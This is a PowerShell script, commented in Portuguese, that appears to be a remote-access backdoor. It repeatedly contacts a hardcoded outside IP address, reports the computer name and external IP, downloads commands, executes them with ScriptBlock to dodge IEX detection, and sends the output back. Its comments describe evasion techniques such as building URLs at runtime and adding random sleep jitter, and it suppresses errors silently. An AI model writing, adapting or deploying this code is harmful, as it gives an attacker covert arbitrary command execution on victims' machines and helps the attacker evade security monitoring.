# Configurações Iniciais
$h = "194.163.168.11:80"
$u = "lumen"
$id = "PS-CL-" + $env:COMPUTERNAME
$prot = "http://"

# URLs montadas dinamicamente para evitar detecção de strings estáticas
$u_png = "$prot$h/api/ping"
$u_cmd = "$prot$h/api/get_comando"
$u_res = "$prot$h/api/command_result"

# Função para execução silenciosa sem chamar IEX diretamente
function Exec-Job {
    param($c)
    try {
        $s = [ScriptBlock]::Create($c)
        $r = $s.InvokeReturnAsIs()
        return $r | Out-String
    } catch {
        return "ERR: " + $_.Exception.Message
    }
}

# Loop principal
while ($true) {
    # Jitter: Dorme aleatório entre 3 e 8 segundos para evitar padrão fixo
    $slp = Get-Random -Minimum 3 -Maximum 8
    
    try {
        # Tenta pegar IP externo ou usa local
        try { $myip = (Invoke-RestMethod "https://api.ipify.org" -TimeoutSec 5).Trim() } catch { $myip = "127.0.0.1" }

        # 1. PING
        $bodyP = @{ user = $u; client_id = $id; ip = $myip } | ConvertTo-Json -Compress
        $null = Invoke-RestMethod -Uri $u_png -Method POST -Body $bodyP -ContentType "application/json" -TimeoutSec 10 -ErrorAction SilentlyContinue

        # 2. GET COMANDO
        $bodyC = @{ user = $u; client_id = $id } | ConvertTo-Json -Compress
        $resp = Invoke-RestMethod -Uri $u_cmd -Method POST -Body $bodyC -ContentType "application/json" -TimeoutSec 10 -ErrorAction SilentlyContinue

        # Verifica se tem comando válido
        if ($resp -and $resp.PSObject.Properties.Match('comando') -and $resp.comando.Length -gt 1) {
            
            # Executa
            $out = Exec-Job -c $resp.comando

            # 3. POST RESULTADO
            $bodyR = @{ user = $u; client_id = $id; result = $out } | ConvertTo-Json -Compress
            $null = Invoke-RestMethod -Uri $u_res -Method POST -Body $bodyR -ContentType "application/json" -TimeoutSec 10 -ErrorAction SilentlyContinue
        }

    } catch {
        # Silencioso
    }
    
    Start-Sleep -Seconds $slp
}
